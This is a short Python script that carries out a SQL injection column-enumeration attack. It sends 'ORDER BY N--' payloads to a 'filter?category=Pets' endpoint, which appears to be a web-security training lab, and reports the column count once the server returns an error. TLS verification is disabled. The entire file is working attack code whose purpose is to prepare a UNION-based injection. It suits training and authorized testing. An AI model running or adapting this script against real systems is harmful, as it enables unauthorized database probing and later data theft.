import sys
import requests # making get and post request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# For any config i make , go through my proxy
#proxies = {'http':'http://127.0.0.1:8000', 'https':'https://127.0.0.1::8000'}

def exploit_sqli_column_number(url):
    path = "filter?category=Pets"
    for i in range(1,50):
        sqli_payload = "'order+by+%s--" %i
        r = requests.get(url+path+sqli_payload, verify=False)#,proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        
        i = i + 1

    return False
if __name__ == '__main__':
    try:
        url= sys.argv[1].strip()
    except IndexError:
        print("[-] Usage:%s <url>" % sys.argv[0])
        print("[-] Example:%s www.example.com" %sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out the number of columns..")
    num_columns = exploit_sqli_column_number(url)
    if num_columns:
        print("[+] The number columns is %s" % num_columns)
    else:
        print("[+] The sqli attack wwas not successful.")
    
    
